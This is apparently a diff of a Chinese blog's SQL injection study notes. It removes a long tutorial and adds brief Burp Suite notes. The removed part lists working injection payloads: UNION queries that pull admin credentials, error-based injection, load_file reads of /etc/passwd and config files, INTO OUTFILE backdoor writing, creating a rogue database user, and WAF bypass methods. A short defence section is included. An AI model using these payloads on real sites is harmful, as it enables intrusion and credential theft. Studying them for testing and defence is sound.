-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Text 保存较大的文本</span><br><span class="line">Blob 保存较大的二进制数据</span><br><span class="line"></span><br><span class="line">text类型最大的应用是保留后门脚本注入到web服务器中</span><br><span class="line"></span><br><span class="line">enum 只能选择一个表格规定的元素</span><br><span class="line">set  只能选择表格规定的元素，不限个数</span><br><span class="line"></span><br><span class="line">find_in_set（元素，列/集合）</span><br><span class="line">find_in_set(left(version()),&quot;a&quot;,&quot;b&quot;)=1</span><br></pre></td></tr></table></figure>
-
-<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">between</span><br><span class="line">in()</span><br><span class="line">not in()</span><br><span class="line">is null</span><br><span class="line">is not null</span><br><span class="line">like</span><br><span class="line">%任意字符</span><br></pre></td></tr></table></figure>
-
-<p>盲注</p>
-<p>length(user())&lt;15</p>
-<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">and</span><br><span class="line">or</span><br><span class="line">not</span><br><span class="line">xor</span><br><span class="line"></span><br><span class="line">不变逻辑</span><br><span class="line">and 1=1</span><br><span class="line">or 1=2</span><br><span class="line">&amp;&amp;！！！！！！！！1</span><br><span class="line">and password=&#x27;&#x27;=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">空集逻辑</span><br><span class="line">and 1=2</span><br><span class="line">and 0=true</span><br><span class="line">&amp;&amp;！1</span><br><span class="line"></span><br><span class="line">全集逻辑</span><br><span class="line">or 1=1</span><br><span class="line">or ！！！1</span><br><span class="line">or ！！！1=~~2</span><br><span class="line"></span><br><span class="line">password=&#x27;&#x27;=&#x27;&#x27;可以绕过密码验证</span><br></pre></td></tr></table></figure>
-
-<h2 id="字典元数据"><a href="#字典元数据" class="headerlink" title="字典元数据"></a>字典元数据</h2><ol>
-<li><p>sql注入提权后创建一个用户</p>
-<p>insert into mysql.user(user,host,password) values(‘admin’,’%’,password(‘abc’))</p>
-</li>
-<li><p>mysql主要保存了那些敏感信息表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户表user：保存主机，用户名，密码等重要信息</span><br><span class="line">数据库权限db：保存了对数据库级别的权限信息</span><br><span class="line">字段权限表columns_priv：保存了字段的详细权限分配信息</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如何获取所有的数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">select schema_name from information_schema.schemata;</span><br><span class="line">select distinct table_schema from information_schema.tables;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>information_schema</p>
-<p>保存了所有数据库相关的元数据信息，包括所有数据库，表和字段等字典元数据信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">表SCHEMATA：数据库相关的定义信息</span><br><span class="line">表TABLES：表定义属性的所有元数据信息</span><br><span class="line">表COLUMNS：所有数据库下的所有表的所有字段信息</span><br><span class="line">ROUTINES：存储过程或者函数信息</span><br><span class="line">VIEWS:视图信息</span><br><span class="line">TRIGGERS：触发器信息</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前数据库所有表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select database()可以查询当前的数据库名称</span><br><span class="line">select table_name from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获得表的所有字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from columns where table_schema=database() and table_name=&#x27;users&#x27;;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="探子回报函数"><a href="#探子回报函数" class="headerlink" title="探子回报函数"></a>探子回报函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">显示登录用户和主机名</span><br><span class="line">select user();</span><br><span class="line">select current_user();</span><br><span class="line">select session_user();</span><br><span class="line"></span><br><span class="line">返回数据库当前版本</span><br><span class="line">select version()</span><br><span class="line"></span><br><span class="line">返回当前数据库</span><br><span class="line">select database()</span><br><span class="line"></span><br><span class="line">length()</span><br><span class="line">left(database(),1)</span><br><span class="line">substring(database(),1,1)</span><br><span class="line">position(&#x27;@&#x27; in user())</span><br><span class="line">locate(&#x27;@&#x27;,user())</span><br><span class="line"></span><br><span class="line">探子：测试程序是否同时对函数，子查询，括号等是否过滤</span><br><span class="line">user()、version()</span><br><span class="line">user()返回情况</span><br><span class="line">mysql返回root@localhost</span><br><span class="line">oracle返回sys</span><br><span class="line">sqlserver返回sa</span><br><span class="line">探子回报：程序对函数，括号()和子查询并未做过滤，可能可以执行函数，自查徐等复杂逻辑</span><br><span class="line">探子未回报，基本上说明注入攻击困难或注入可能性小</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/01/SQLInject/2-7%E6%8E%A2%E5%AD%90%E5%9B%9E%E6%8A%A5%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E5%BA%94%E7%94%A8.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_864.jpg" alt="2-7探子回报函数以及应用.pcwl_视频截图_864"></p>
-<h2 id="时间窃取函数"><a href="#时间窃取函数" class="headerlink" title="时间窃取函数"></a>时间窃取函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/01/SQLInject/image-20211104164830592.png" alt="image-20211104164830592"></p>
-<blockquote>
-<p>虽然只睡眠1秒，但是有5条记录，每条睡一秒，一共睡5秒</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">相关函数</span><br><span class="line">select sleep(1):睡眠1秒</span><br><span class="line">select left(user(),1)：获得user（）最左边1位</span><br><span class="line">substring()获得字符串任意位置的任意个字符</span><br><span class="line">benchmark()：对运算执行压力测试</span><br><span class="line">if(条件，真执行，假执行)</span><br></pre></td></tr></table></figure>
-
-<h2 id="自报家底相关函数"><a href="#自报家底相关函数" class="headerlink" title="自报家底相关函数"></a>自报家底相关函数</h2><p>没有错误也要制造错误，并把查询的信息用错误带出来。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">group_concat()   将所有查询数据用，拼接起来</span><br><span class="line"></span><br><span class="line">相关函数：if(),rand(),floor(),ifnull(),concat(),group_concat()</span><br><span class="line"></span><br><span class="line">group by 分组</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(user(),floor(rand()*2)) as a from users group by a;</span><br><span class="line">正常group by 是不会报错的</span><br><span class="line">但是由于rand随机函数，在0,0,1,0,0的情况下，由于两组分开会报错</span><br><span class="line">group by 会将分组键当作主键，主键不能重复冲突</span><br></pre></td></tr></table></figure>
-
-<h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
-<li><p>确认目标网站</p>
-</li>
-<li><p>信息收集、分析与提取</p>
-</li>
-<li><p>网站技术分析：寻找和测试可用注入点，网页输入输出机制分析</p>
-</li>
-<li><p>探子回报：注入sql确定数据库类型，当前账户权限级别</p>
-</li>
-<li><p>提权分析：根据用户级别确定是否可以与系统层交互提权，是否可以与数据库层交互提权，是否可以获取web后台管理员权限的可能性</p>
-</li>
-<li><p>网站可用sql注入测试类型，盲注？显注？</p>
-</li>
-<li><p>盲注策略：使用注入分析工具替代人工</p>
-<p>显注策略：第三者上位</p>
-</li>
-</ol>
-<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ol>
-<li><p>没有无用的信息</p>
-</li>
-<li><p>一般信息收集、分析与提取</p>
-<ol>
-<li>域名信息</li>
-<li>域名信息的扩展信息，如注册人，公司，联系电话等信息收集</li>
-<li>网站所有工作人员的信息收集，比技术研发人员相关联系方式，qq、手机，博客，微博等。目标是获取相关人员对密码设置的习惯和规律</li>
-</ol>
-</li>
-<li><p>技术分析</p>
-<ol>
-<li>技术分析：一般信息关联的可能性，网页源代码分析，输入输出机制分析， 寻找和测试可用注入点</li>
-</ol>
-</li>
-</ol>
-<h4 id="网站技术分析"><a href="#网站技术分析" class="headerlink" title="网站技术分析"></a>网站技术分析</h4><ol>
-<li><p>注入点发现与测试</p>
-<ol>
-<li><p>常见注入点</p>
-<ol>
-<li>表单中的输入域</li>
-<li>URL的参数</li>
-<li>Cookie或者隐藏域</li>
-</ol>
-</li>
-<li><p>如何发现注入点</p>
-<ol>
-<li><p>表单中的输入域、cookie、隐藏域</p>
-<p>对输入输出机制进行分析、过滤、提取，并了解执行注入sql的可能机制，比如field，cookie，url参数的变量名是啥，如何传递给数据库引擎</p>
-</li>
-<li><p>URL参数</p>
-<p>字符类型参数：引号闭合</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1  不变逻辑</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;2  空集逻辑</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1   全集逻辑</span><br></pre></td></tr></table></figure>
-
-<p>整数型草书</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=1		不变逻辑</span><br><span class="line">and 1=2		空集逻辑</span><br><span class="line">or 1=1		全集逻辑</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-<h4 id="探子回报"><a href="#探子回报" class="headerlink" title="探子回报"></a>探子回报</h4><ol>
-<li><p>探子回报应用</p>
-<ol>
-<li><p>数据类型确认</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据类型确认：version()</span><br><span class="line">网页注入测试：and substring(version(),1,1)=5</span><br><span class="line">返回正确说明：</span><br><span class="line">1.数据库为mysql</span><br><span class="line">2.对执行数据库函数未进行过滤</span><br><span class="line">3.对括号未过滤</span><br><span class="line">4.可能对子查询未过滤</span><br><span class="line">5.可注入复杂逻辑</span><br><span class="line">6.评估注入可进行的程度</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>用户权限级别确认</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用户权限级别确认：user()</span><br><span class="line">网页注入测试：and (select length(user()) from mysql.user where user like &#x27;z%&#x27;)&gt;1</span><br><span class="line">返回正确说明：</span><br><span class="line">1.对mysql字典数据库有权限，否则无权限。</span><br><span class="line">如果无权限，在对密码获取受限，必须另想方法，如web网站后台管理员密码。</span><br><span class="line">2.如对mysql字典库无权限，则需要测试对information_schema字典库测试权限</span><br><span class="line">and (select count(*) from information_schema.tables where table_schema=databaase())&gt;1</span><br><span class="line">返回正确则说明，对information_schema字典库有权限，可以获取所有数据库、所有表、所有字典信息。对攻破web后台管理员权限有帮助</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h4 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h4><ol>
-<li><p>sql注入系统层交互提权</p>
-<ol>
-<li><p>与系统层交互的方式</p>
-<ol>
-<li>读和写磁盘文件</li>
-<li>直接执行命令</li>
-</ol>
-<p>与系统层交互提交，取决于mysql服务器进程以什么权限运行，程序连接的数据库账户以什么权限级别使用</p>
-</li>
-<li><p>读取文件</p>
-<ol>
-<li><p>读取&#x2F;etc&#x2F;password文件</p>
-<p>select load_fiel(‘&#x2F;etc&#x2F;password’)</p>
-<p>盲注时配合substring,char,ascii等</p>
-</li>
-<li><p>读取网站配置文件以获得用户名和密码信息</p>
-<p>select load_file(‘&#x2F;var&#x2F;www&#x2F;weba&#x2F;dbconfig.conf’)</p>
-</li>
-</ol>
-</li>
-<li><p>写入有数据库连接的留后门脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 1. select &#x27;&lt;scripts language=&quot;javascript&quot;&gt;gogogo&lt;/scripts&gt;&#x27; into outfile &#x27;/var/www/weba&#x27;;</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><p>sql注入漏洞工具的使用</p>
-<ol>
-<li><p>sql漏洞检测工具</p>
-<ol>
-<li>替换人工办法自动检测有漏洞的URL	<code>Safe3 SQL Injector</code></li>
-<li>对指定的URL进行穷举可能的注入<code>sqlmap</code></li>
-</ol>
-</li>
-<li><p>Safe3 SQL Injector</p>
-<p>safe3 SQL Injector是一个最强大和最易使用的渗透测试工具,它可以自动检测和利用SαL注入漏洞和数据库服务器的过程中。<br>SQL<br>safe3 SQL Injector具备读取 MySQL、 Oracle、 Postgre SQL、SQL Server、 Access、 SQLite、 Firebird、 Sybase、SAP MaxDB等数据库的能力。同时支持向 My SQL、 SQL Server写入文件,以及 SQL Server和 Oracle中执行任意命令。Safe3SQL injector也支持支持基于eror- based、Unon- based和 blind time-based的注入攻击。</p>
-</li>
-<li><p>sqlmap</p>
-<p>对指定URL进行穷举检测</p>
-</li>
-</ol>
-</li>
-<li><p>攻破后台获取web管理员权限</p>
-<ol>
-<li><p>获取当前连接的所有数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(schema_name,char(10),&#x27;&#x27;,char(10),&#x27;&#x27;,char(10)) from information_schema.schemata limit 1,10 --</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获得当前数据库的所有表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(table_schema,char(10),table_name,char(10),table_rows,char(10),table_comment) from information_schema.tables where table_schema=database() limit 1,10 --</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获得web后台管理员密码可能所在的表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(table_schema,char(10),table_name,char(10),table_rows,char(10),table_comment) from information_schema.tables where table_schema=database() and table_name&gt;=&#x27;a&#x27; and table_name&lt;&#x27;b&#x27; limit 1,10 --</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(table_schema,char(10),table_name,char(10),table_rows,char(10),table_comment) from information_schema.tables where table_schema=database() and table_name like &#x27;%user%&#x27; limit 1,10 --</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获得用户表的所有字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(table_schema,char(10),table_name,char(10),column_name,char(10),cplumn_comment) from information_schema.tables where table_schema=database() and table_name=&#x27;member&#x27; limit 1,10 --</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获得web后台管理员的用户名、密码、邮箱等敏感信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(ifnull(&#x27;member_name&#x27;,&#x27;no_name&#x27;),char(10),ifnull(&#x27;mobile&#x27;,&#x27;no_mobile&#x27;),char(10),ifnull(&#x27;e_mail&#x27;,&#x27;no_email&#x27;),char(10),ifnull(&#x27;pwd&#x27;,&#x27;no_pwd&#x27;)) from information_schema.tables where table_schema=database() and table_name=&#x27;member&#x27; limit 1,10 --</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-<h4 id="网站可用sql注入测试类型"><a href="#网站可用sql注入测试类型" class="headerlink" title="网站可用sql注入测试类型"></a>网站可用sql注入测试类型</h4><ol>
-<li><p>攻击类型与攻击策略</p>
-<ol>
-<li><p>sql注入类型</p>
-<ol>
-<li>盲注：输出数据库的内容再网页中没有显示</li>
-<li>报错注：充分利用程序、数据库报错的帮助获得所有信息</li>
-<li>显注：注入查询语句的内容在网页中有显示</li>
-<li>其他：email、ftp、samba等协议</li>
-</ol>
-</li>
-<li><p>盲注</p>
-<ol>
-<li>在网页中没有找到或者暂时没有找到输出的地方</li>
-<li>确认输入变量可以执行逻辑判断，只得到对或错两种结果</li>
-<li>盲注困难，有时候需要借助工具进行盲注攻击，但花费时间较长，需要耐心</li>
-</ol>
-</li>
-<li><p>报错注</p>
-<p>充分利用数据库报错和程序报错所提供的信息，让数据库引擎和程序，暴露出所需要的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat((select (select (select schema_name from information_schema.schemata limit 0 ,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2)) x_col from information_schema.tables group by x_col</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>显注</p>
-<p>在网页中寻找注入点，把程序正常信息替换为注入者信息</p>
-<p>显注直接得到明文信息，不需要猜测，获得敏感信息容易和快速</p>
-</li>
-</ol>
-</li>
-<li><p>寻找显注注入点</p>
-<ol>
-<li><p>union寻找处理字段数和第三者上位点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8 --</span><br></pre></td></tr></table></figure>
-
-<p>意义：</p>
-<ol>
-<li>逐个测试处理字段数，直到网页显示正常，测试程序对union处理逻辑</li>
-<li>在说明程序处理的字段数室多少</li>
-<li>在网页上显示的第三者上位点室第几个字段</li>
-</ol>
-</li>
-<li><p>上位点利用测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,user(),7,8 --</span><br></pre></td></tr></table></figure>
-
-<p>数据库版本确认version()</p>
-<p>数据库名database()</p>
-</li>
-<li><p>字典子查询测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,table_name,3,4,5,6,7,8  from information_schema.tables where table_schema=database() limit 1--</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>–的目标是对后面的子句注释掉，这样就能查询我们想要的字典表</li>
-<li>table_name显示测试位的可能性和如何替代商品所有选项的可能性</li>
-</ol>
-</li>
-<li><p>商品所有选项完全替换</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,concat(table_schema,char(10),table_name,3,4,5,6,7,8  from information_schema.tables where table_schema=database() limit 1,10--</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-<h4 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h4><ol>
-<li><p>sql注入应用层防御</p>
-<ol>
-<li><p>应用层防御目标</p>
-<ol>
-<li>sql注入本质原因是应用层的问题</li>
-<li>sql注入应用层防御的目标是修复sql所有的可能漏洞</li>
-</ol>
-</li>
-<li><p>过滤sql注入基本字符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &quot;				字符串闭合</span><br><span class="line">-- or #				单行注释</span><br><span class="line">/*···*/				多行注释</span><br><span class="line">+					url中替代空格拼接字符</span><br><span class="line">concat 				字符拼接</span><br><span class="line">%					通配符</span><br><span class="line">?param1=foo&amp;param2=bar	url参数</span><br><span class="line">select 				url打印常量</span><br><span class="line">@variable			本地变量</span><br><span class="line">@@variable			全局变量</span><br><span class="line">sleep 10 			睡眠10秒</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>过滤sql关键字</p>
-<p><img src="/2021/11/01/SQLInject/3-9%E5%BA%94%E7%94%A8%E5%B1%82%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_148.jpg" alt="3-9应用层如何防御.pcwl_视频截图_148"></p>
-</li>
-<li><p>url传参的整体加密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原url</span><br><span class="line">https://61.206.45.132/corp/tokusyu.php?mid=1&amp;tksid=473</span><br><span class="line"></span><br><span class="line">整体加密处理:</span><br><span class="line">https://61.206.45.132/corp/tokusyu.php?action=xnnakuiqlnZHRE14DAFEWQ</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><p>系统层如何防御</p>
-<ol>
-<li>系统层防御目标<ol>
-<li>sql注入的本质原因不是由系统层的问题</li>
-<li>系统层的防御是辅助的作用，是预防sql注入与系统层交互提权，预防sql注入权限的进一步扩大，使得sql注入在系统层无所作为</li>
-</ol>
-</li>
-<li>系统层防御方法<ol>
-<li>iptables限制只允许特定服务器IP和端口登录</li>
-<li>使用应用防火墙对sql注入拒绝waf</li>
-<li>数据库安全中间件：greensql，安全狗</li>
-</ol>
-</li>
-</ol>
-</li>
-<li><p>数据库层防御</p>
-<ol>
-<li>数据库层防御目标<ol>
-<li>sql注入本质不在数据库层的问题</li>
-<li>数据库层防御的目标是辅助性的，预防sql注入在数据层交互提权，防止sql注入成功后权限和数据进一步泄露进一步扩大</li>
-</ol>
-</li>
-<li>sql权限的最小化<ol>
-<li>revoke收回权限</li>
-<li>程序连接的权限分配以最小化为原则</li>
-</ol>
-</li>
-<li>数据库层规范化要求<ol>
-<li>这个DBA专业的sql设计审计要求</li>
-<li>如何设计尽量保持高性能，同时也要预防sql测试出错的可能性</li>
-<li>数据库架构设计考虑性能与安全的权衡，通常在保障性能的前提下去考虑安全性的折中</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ul>
-<li><p>updatexml()</p>
-<ul>
-<li><p>函数作用：改变（查找并替换）XML 文档中符合条件的节点的值</p>
-</li>
-<li><p>语法：<code>UPDATEXML (XML_document, XPath_string, new_value)</code></p>
-</li>
-<li><p>参数</p>
-<ul>
-<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li>
-<li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。</li>
-<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li>
-</ul>
-</li>
-<li><p>例如：<code>updatexml(1, concat(0x7e, version()), 0)#</code></p>
-</li>
-</ul>
-</li>
-<li><p>extractvalue()</p>
-<ul>
-<li><p>函数作用：从目标XML中返回包含所查询值的字符串</p>
-</li>
-<li><p>语法：<code>ExtractValue(xml_document, XPathstring)</code></p>
-</li>
-<li><p>参数</p>
-<ul>
-<li>第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称</li>
-<li>第二个参数： XPathstring，XPath 格式的字符串</li>
-</ul>
-</li>
-<li><p>例如：<code>extractvalue(1,concat(0x7e,database()))#</code></p>
-</li>
-</ul>
-</li>
-<li><p>floor()</p>
-<ul>
-<li><p>函数作用：向下取整</p>
-</li>
-<li><p>语法：<code>floor()</code></p>
-</li>
-<li><p>如果要用 floor() 构成报错，必须满足下面的条件</p>
-<ul>
-<li>运算中有 count</li>
-<li>运算中有 group by</li>
-<li>运算中有 rand</li>
-</ul>
-</li>
-<li><p>例如：<code>(select 2 from (select count(*), concat(version(), floor(rand(0) * 2))x from information_schema.tables group by x)a)#</code></p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p><img src="/2021/11/01/SQLInject/image-20220301101452987.png" alt="image-20220301101452987"></p>
-<ul>
-<li><p>前提条件：</p>
-<ul>
-<li><p>需要知道远程目录</p>
-</li>
-<li><p>需要远程目录有写权限</p>
-</li>
-<li><p>需要数据库开启了 secure_file_priv，MySQL新特性，没有开启的话 into outfile 是不能写入的</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>有时<code>&#39;&quot;/</code>等字符会被转义，为避免转义采用宽字节注入，汉字有两个字节，例如：<code>%df%5c</code>代表連</p>
-<p>应用案例：<code>%df&#39;</code></p>
-<h4 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h4><ul>
-<li>联合查询</li>
-<li>http-header注入</li>
-<li>报错注入</li>
-<li>布尔盲注</li>
-<li>延时注入</li>
-<li>宽字节注入</li>
-<li>堆叠注入</li>
-<li>DNSlog注入</li>
-<li>偏移注入</li>
-<li>二次注入攻击</li>
-</ul>
-<h4 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h4><ul>
-<li>大小写绕过</li>
-<li>编码绕过</li>
-<li>双写绕过</li>
-<li>换行（\n）绕过</li>
-<li>注释符内联注释绕过</li>
-<li>同义词替换</li>
-<li>HTTP参数污染<ul>
-<li>多个参数，waf只检测其中的一个</li>
-</ul>
-</li>
-<li>垃圾参数</li>
-<li>分块传输</li>
-</ul>
+<h2 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h2><p>一款手工验证HTTP消息的测试工具，通常用于多次重放请求响应和手工修改请求消息的修改后对服务器端响应的消息分析</p>
+<h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><p>用于检测数据样本随机性质量的工具，通常用于检测访问令牌是否课预测、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能降低关键数据被伪造的风险</p>
+<h2 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h2><p>对字符串进行加解密操作</p>
+<h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>针对两个不同的HTTP请求进行比较</p>
+<h2 id="burp-sqlmap"><a href="#burp-sqlmap" class="headerlink" title="burp+sqlmap"></a>burp+sqlmap</h2><p>安装gason.jar插件</p>
+<p>安装sqlmap插件</p>
